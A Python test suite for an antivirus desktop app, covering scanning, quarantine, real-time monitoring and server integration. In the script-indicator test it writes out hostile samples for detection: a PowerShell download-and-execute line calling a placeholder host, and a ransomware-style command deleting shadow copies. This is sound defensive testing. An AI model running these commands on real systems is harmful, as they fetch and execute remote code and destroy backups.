"""Testes do aplicativo desktop (motor, quarentena, tempo real) e integração com o servidor real."""
import os
import sqlite3
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
_tmp = tempfile.mkdtemp(prefix="aegis-desktop-test-")
os.environ.setdefault("AEGIS_DB", os.path.join(_tmp, "shared.db"))
os.environ.setdefault("AEGIS_SECRET_KEY", "chave-de-teste")
os.environ.setdefault("AEGIS_HOME", os.path.join(_tmp, "home"))
os.environ["AEGIS_DISABLE_CLAMAV"] = "1"          # testes herméticos: ignora um ClamAV real da máquina
sys.path.insert(0, str(ROOT / "desktop"))
sys.path.insert(0, str(ROOT / "server"))

import config  # noqa: E402
import engine  # noqa: E402
import realtime  # noqa: E402
from api_client import ApiError  # noqa: E402
from controller import Controller  # noqa: E402
from quarantine import Quarantine, QuarantineError  # noqa: E402


def write(path, data):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(path)


class EngineTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(dir=_tmp))
        self.scanner = engine.Scanner(engine.Signatures.builtin())

    def test_eicar_by_hash_and_by_pattern(self):
        exact = write(self.dir / "a.txt", engine.EICAR_BYTES)
        padded = write(self.dir / "b.txt", engine.EICAR_BYTES + b"\r\n" + b"x" * 50)
        for path in (exact, padded):
            res = self.scanner.scan_file(path)
            self.assertEqual(res.verdict, "malicious", path)
            self.assertEqual(res.threat, "EICAR-Test-File")

    def test_clean_files(self):
        res = self.scanner.scan_file(write(self.dir / "ok.txt", "olá, mundo"))
        self.assertEqual(res.verdict, "clean")
        self.assertEqual(self.scanner.scan_file(write(self.dir / "ok.bat", "echo oi")).verdict, "clean")

    def test_signature_update_changes_detection(self):
        path = write(self.dir / "t.txt", engine.AEGIS_TEST_BYTES)
        self.assertEqual(self.scanner.scan_file(path).verdict, "clean")        # assinatura ainda não existe
        import base64
        updated = engine.Signatures.from_server({"versao": 2, "hashes": {}, "padroes": [
            {"nome": "AEGIS-Test-Signature", "b64": base64.b64encode(engine.AEGIS_TEST_BYTES).decode()}]})
        res = engine.Scanner(updated).scan_file(path)
        self.assertEqual(res.verdict, "malicious")
        self.assertEqual(res.threat, "AEGIS-Test-Signature")

    def test_heuristic_scores(self):
        mz = b"MZ" + b"\x00" * 200
        score, reasons = engine.heuristic_score("/home/u/Downloads/fatura.pdf.exe", mz)
        self.assertEqual(score, 60)
        self.assertTrue(reasons)
        score, _ = engine.heuristic_score("/home/u/Downloads/foto.jpg", mz)
        self.assertEqual(score, 50)
        score, _ = engine.heuristic_score("/home/u/Downloads/setup.exe", mz)
        self.assertEqual(score, 0)                                # exe legítimo comum não pontua
        score, _ = engine.heuristic_score("/home/u/Downloads/relatorio.pdf", b"%PDF-1.7 texto")
        self.assertEqual(score, 0)

    def test_script_indicators(self):
        bad = ("powershell -enc " + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=" + "\nIEX (New-Object Net.WebClient)"
               ".DownloadString('http://x')")
        res = self.scanner.scan_file(write(self.dir / "run.ps1", bad))
        self.assertEqual(res.verdict, "malicious")
        ransom = self.scanner.scan_file(write(self.dir / "x.bat", "vssadmin delete shadows /all /quiet"))
        self.assertEqual(ransom.verdict, "malicious")
        mild = self.scanner.scan_file(write(self.dir / "y.vbs", 'Set s = CreateObject("WScript.Shell")'))
        self.assertEqual(mild.verdict, "clean")                   # um único sinal fraco não basta

    def test_skip_error_and_directory_scan(self):
        big = write(self.dir / "big.bin", b"0" * 100)
        self.assertEqual(engine.Scanner(engine.Signatures.builtin(), max_size=10).scan_file(big).verdict, "skipped")
        self.assertEqual(self.scanner.scan_file(str(self.dir / "nao-existe")).verdict, "error")

        write(self.dir / "pasta" / "e.txt", engine.EICAR_BYTES)
        write(self.dir / "pasta" / "limpo.txt", "ok")
        write(self.dir / "node_modules" / "mal.txt", engine.EICAR_BYTES)     # pasta ignorada
        seen = []
        summary = self.scanner.scan_paths([str(self.dir)], on_result=seen.append)
        self.assertEqual(summary.malicious, 1)
        self.assertEqual(len(seen), 1)
        self.assertGreaterEqual(summary.scanned, 2)

    def test_cancel(self):
        for i in range(5):
            write(self.dir / f"f{i}.txt", "x")
        cancel = threading.Event()
        cancel.set()
        summary = self.scanner.scan_paths([str(self.dir)], cancel=cancel)
        self.assertTrue(summary.cancelled)
        self.assertEqual(summary.scanned, 0)


class QuarantineTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(dir=_tmp))
        self.q = Quarantine(self.dir / "q")

    def test_isolate_restore_delete(self):
        src = write(self.dir / "mal.txt", engine.EICAR_BYTES)
        entry = self.q.add(src, "EICAR-Test-File", ["teste"], "abc")
        self.assertFalse(os.path.exists(src))                                  # original removido
        stored = (self.q.dir / f"{entry['id']}.qr").read_bytes()
        self.assertNotEqual(stored, engine.EICAR_BYTES)                       # conteúdo codificado
        self.assertEqual(len(self.q.list()), 1)

        restored = self.q.restore(entry["id"])
        self.assertEqual(Path(restored).read_bytes(), engine.EICAR_BYTES)
        self.assertEqual(self.q.list(), [])

        entry = self.q.add(restored, "X")
        write(src, "outro arquivo no mesmo lugar")
        again = self.q.restore(entry["id"])                                    # não sobrescreve
        self.assertIn("(restaurado)", again)

        entry = self.q.add(again, "Y")
        self.q.delete(entry["id"])
        self.assertEqual(self.q.list(), [])
        with self.assertRaises(QuarantineError):
            self.q.delete("inexistente")
        with self.assertRaises(QuarantineError):
            self.q.add(str(self.dir / "nao-existe"), "Z")


class RealtimeTests(unittest.TestCase):
    def test_new_files_are_scanned_after_becoming_stable(self):
        folder = Path(tempfile.mkdtemp(dir=_tmp))
        write(folder / "antigo.txt", "já existia")
        fired = []
        w = realtime.Watcher([str(folder)], fired.append)
        w._known = w._snapshot()                                   # base inicial (como em run())
        self.assertEqual(w.poll_once(), [])
        new = write(folder / "novo.txt", "chegou agora")
        write(folder / "baixando.crdownload", "parcial")
        self.assertEqual(w.poll_once(), [])                        # 1º ciclo: ainda "pendente"
        self.assertEqual(w.poll_once(), [new])                     # 2º ciclo: estável → verifica
        self.assertEqual(w.poll_once(), [])
        self.assertEqual(fired, [new])
        write(folder / "novo.txt", "alterado")
        w.poll_once()
        self.assertEqual(w.poll_once(), [new])                     # alterações também disparam


class ControllerOfflineTests(unittest.TestCase):
    def test_scan_quarantines_automatically(self):
        events = []
        ctl = Controller(emit=lambda k, p=None: events.append((k, p)))
        self.assertFalse(ctl.logged_in)
        folder = Path(tempfile.mkdtemp(dir=_tmp))
        write(folder / "ok.txt", "limpo")
        files = ctl.create_test_files(str(folder / "testes"))
        self.assertEqual(len(files), 2)
        ctl.start_scan("personalizada", [str(folder)]).join(10)
        kinds = [k for k, _ in events]
        self.assertIn("scan_done", kinds)
        results = [p for k, p in events if k == "result"]
        self.assertEqual(len(results), 1)                          # só o EICAR (o teste AEGIS exige atualização)
        self.assertEqual(results[0].action, "quarentena")
        self.assertFalse(os.path.exists(files[0]))
        self.assertTrue(os.path.exists(files[1]))
        self.assertGreaterEqual(len(ctl.quarantine.list()), 1)
        with self.assertRaises(ApiError):
            ctl.update_signatures()                                # sem conta não atualiza
        with self.assertRaises(PermissionError):
            ctl.start_realtime()
        with self.assertRaises(ValueError):
            ctl.start_scan("rapida", [str(folder / "nao-existe")])


# ---------------------------------------------------------------------------
# Integração: aplicativo ↔ servidor real (HTTP)
# ---------------------------------------------------------------------------
class IntegrationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import app as aegis
        from werkzeug.serving import make_server
        cls.aegis = aegis
        cls.server = make_server("127.0.0.1", 0, aegis.app, threaded=True)
        cls.url = f"http://127.0.0.1:{cls.server.server_port}"
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()

        cls.web = aegis.app.test_client()
        import re
        html = cls.web.get("/cadastro").get_data(as_text=True)
        token = re.search(r'name="_csrf" value="([^"]+)"', html).group(1)
        cls.email = "integracao@teste.com"
        cls.web.post("/cadastro", data={"_csrf": token, "nome": "Cliente Integração", "email": cls.email,
                                        "senha": "Senha1234", "aceite": "on"})

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()

    def test_full_flow(self):
        events = []
        ctl = Controller(emit=lambda k, p=None: events.append((k, p)))
        ctl.settings.server_url = self.url
        ctl.realtime_interval = 0.3

        with self.assertRaises(ApiError) as ctx:
            ctl.login(email=self.email, senha="errada123")
        self.assertEqual(ctx.exception.status, 401)

        user = ctl.login(email=self.email, senha="Senha1234")
        self.assertEqual(user["plano"], "essencial")
        self.assertFalse(ctl.can_realtime)
        self.assertTrue(ctl.logged_in)

        # --- assinaturas: o arquivo de teste AEGIS só é detectado depois de atualizar
        folder = Path(tempfile.mkdtemp(dir=_tmp))
        aegis_test = write(folder / "aegis_update_test.txt", engine.AEGIS_TEST_BYTES)
        self.assertEqual(ctl.scanner().scan_file(aegis_test).verdict, "clean")
        self.assertTrue(ctl.update_signatures())
        self.assertEqual(ctl.signatures.version, 2)
        self.assertFalse(ctl.update_signatures())                  # já atualizado
        self.assertEqual(ctl.scanner().scan_file(aegis_test).verdict, "malicious")

        # --- verificação + envio do relatório ao painel
        write(folder / "eicar_test.txt", engine.EICAR_BYTES)
        ctl.start_scan("personalizada", [str(folder)]).join(15)
        time.sleep(0.5)
        with sqlite3.connect(os.environ["AEGIS_DB"]) as conn:
            scans = conn.execute("SELECT s.ameacas, s.arquivos FROM scans s JOIN users u ON u.id=s.user_id "
                                 "WHERE u.email=?", (self.email,)).fetchall()
            dets = conn.execute("SELECT arquivo, acao FROM detections d JOIN users u ON u.id=d.user_id "
                                "WHERE u.email=?", (self.email,)).fetchall()
        self.assertEqual(scans[-1][0], 2)
        self.assertEqual(sorted(d[0] for d in dets), ["aegis_update_test.txt", "eicar_test.txt"])
        self.assertTrue(all(d[1] == "quarentena" for d in dets))
        self.assertIn("eicar_test.txt", self.web.get("/sistema?aba=historico").get_data(as_text=True))

        # --- limite de dispositivos do plano Essencial
        other = Controller(emit=lambda *a: None)
        other.settings.server_url = self.url
        with unittest.mock.patch.object(config, "device_id", return_value="outro-dispositivo-123"):
            with self.assertRaises(ApiError) as ctx:
                other.login(email=self.email, senha="Senha1234")
        self.assertEqual(ctx.exception.status, 403)

        # --- upgrade no site libera o tempo real no app
        import re
        html = self.web.get("/sistema").get_data(as_text=True)
        token = re.search(r'name="_csrf" value="([^"]+)"', html).group(1)
        resp = self.web.post("/comprar/plus", data={"_csrf": token, "nome": "Cliente", "numero": "4242424242424242",
                                                     "validade": "12/40", "cvv": "123"})
        self.assertEqual(resp.status_code, 302)
        ctl.refresh_account()
        self.assertTrue(ctl.can_realtime)

        monitored = Path(tempfile.mkdtemp(dir=_tmp))
        ctl.settings.watch_folders = [str(monitored)]
        ctl.start_realtime()
        self.assertTrue(ctl.realtime_running)
        time.sleep(0.5)
        bad = write(monitored / "baixado.txt", engine.EICAR_BYTES)
        deadline = time.time() + 10
        while time.time() < deadline and not any(k == "rt_event" for k, _ in events):
            time.sleep(0.2)
        ctl.stop_realtime()
        rt = [p for k, p in events if k == "rt_event"]
        self.assertEqual(len(rt), 1)
        self.assertEqual(rt[0].action, "quarentena")
        self.assertFalse(os.path.exists(bad))

        # --- sessão salva permite reabrir o app sem novo login
        again = Controller(emit=lambda *a: None)
        self.assertTrue(again.logged_in)

        # --- remover o dispositivo no painel derruba a sessão do app
        with sqlite3.connect(os.environ["AEGIS_DB"]) as conn:
            conn.execute("DELETE FROM devices WHERE user_id=(SELECT id FROM users WHERE email=?)", (self.email,))
        ctl.refresh_account()
        self.assertFalse(ctl.logged_in)
        self.assertIn("logout", [k for k, _ in events])

    def test_license_key_login(self):
        with sqlite3.connect(os.environ["AEGIS_DB"]) as conn:
            key = conn.execute("SELECT license_key FROM users WHERE email=?", (self.email,)).fetchone()[0]
        ctl = Controller(emit=lambda *a: None)
        ctl.settings.server_url = self.url
        with unittest.mock.patch.object(config, "device_id", return_value="lic-dispositivo-456"):
            try:
                user = ctl.login(license_key=key)
                self.assertEqual(user["email"], self.email)
            except ApiError as exc:                                 # limite do plano pode ter sido atingido
                self.assertEqual(exc.status, 403)

    def test_unreachable_server(self):
        ctl = Controller(emit=lambda *a: None)
        ctl.settings.server_url = "http://127.0.0.1:9"
        with self.assertRaises(ApiError) as ctx:
            ctl.login(email="a@b.co", senha="x")
        self.assertEqual(ctx.exception.status, 0)


import unittest.mock  # noqa: E402

if __name__ == "__main__":
    unittest.main()
